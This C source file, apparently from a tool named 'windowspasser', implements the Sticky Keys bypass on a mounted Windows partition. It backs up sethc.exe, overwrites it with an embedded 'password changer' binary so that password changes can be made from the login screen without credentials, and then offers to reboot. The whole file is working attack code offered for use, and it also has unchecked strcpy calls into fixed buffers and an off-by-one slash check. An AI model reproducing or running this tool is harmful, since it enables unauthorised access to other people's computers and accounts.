// Part of windowspasser project @github.com

#include "../../headers/tool.h"
#include "../../bin/DATA.h"

int copy(char *src, char *dst){
	FILE *fsrc, *fdst;
  char buffer[SIZE];
  size_t bytes;

	fsrc = fopen(src, "rb");
	if (fsrc == NULL){
    fprintf(stderr, "Unable to open %s\n", src);
    perror("fopen for source");
    return 1;
	}

	fdst = fopen(dst, "wb");
	if (fdst == NULL){
    fprintf(stderr, "Unable to open %s\n", dst);
    perror("fopen for destination");
    return 1;
	}

  while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fsrc)))
    fwrite(buffer, 1, bytes, fdst);

	fclose(fsrc);
	fclose(fdst);
	return 0;
}

int main(int argc, char *argv[]){
  char rootpath[MAX_PATH];
  char sethcpath[MAX_PATH], backuppath[MAX_PATH];
  FILE *fsethc;

  if(argc < 2){
    puts(HELP);
    return 1;
  }

  strcpy(rootpath, argv[1]);
  if(rootpath[strlen(rootpath) - 2] == '/')
    rootpath[strlen(rootpath) - 2] = '\0';

  // Get complete sethc path.
  strcpy(sethcpath, rootpath);
  strcpy(backuppath, rootpath);
  strcat(sethcpath, SETHC_PATH);
  strcat(backuppath, BACKUP_SETHC_PATH);

  printf("[BACKUP] Copying %s to %s\n", sethcpath, backuppath);
  if(copy(sethcpath, backuppath) == 1)
    return 1;

  printf("Openning %s\n", sethcpath);
  if((fsethc = fopen(sethcpath, "wb")) == NULL){
    perror("fopen sethc");
    return 1;
  }

  puts("Writing password changer exe.");
  if(!fwrite(FAKESH_BIN, sizeof(FAKESH_BIN), 1, fsethc)){
    perror("fwrite sethc");
    return 1;
  }

  fclose(fsethc);
  printf("Reboot?(1/0): ");
  if(getc(stdin) == '1')
    system("reboot");

  return 0;
}
